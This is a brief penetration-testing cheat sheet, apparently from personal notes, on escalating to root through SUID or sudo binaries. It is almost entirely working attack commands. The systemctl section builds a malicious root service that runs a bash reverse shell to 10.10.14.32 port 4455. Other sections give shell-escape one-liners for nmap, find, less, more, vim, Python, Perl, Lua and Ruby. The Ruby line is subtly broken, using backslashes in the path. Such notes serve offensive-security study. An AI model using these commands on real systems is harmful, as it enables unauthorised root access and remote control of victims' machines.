---
description: How to exploit SUID for the following files
---

# SUID

## systemctl

```bash
echo '[Service]              
> Type=oneshot
> User=root
> ExecStart=/bin/bash /home/pepper/getRoot.sh
> [Install]
> WantedBy=multi-user.target' > hack.service

## create getRoot.sh
#!/bin/bash
/bin/bash -i >& /dev/tcp/10.10.14.32/4455 0>&1

systemctl link /home/pepper/hack.service
systemctl enable --now /home/pepper/hack.service
systemctl start hack.service
```

## Nmap

```bash
echo "os.execute('/bin/sh')" > /tmp/shell.nse && sudo nmap --script=/tmp/shell.nse
```

## FIND

```text
find . -exec bash -i \;

```

## LESS

```text
v
:shell
```

## MORE

```text
!bash
```

## VIM

```bash
!/bin/bash
#or
:shell
```

## PYTHON

```python
>> import os
>> os.system('/bin/bash')
```

## PERL

```perl
exec "/bin/bash";
# Ctrl D for EoF
```

## LUA

```lua
> os.execute("/bin/bash")
```

## RUBY

```ruby
exec "\bin\bash"
```

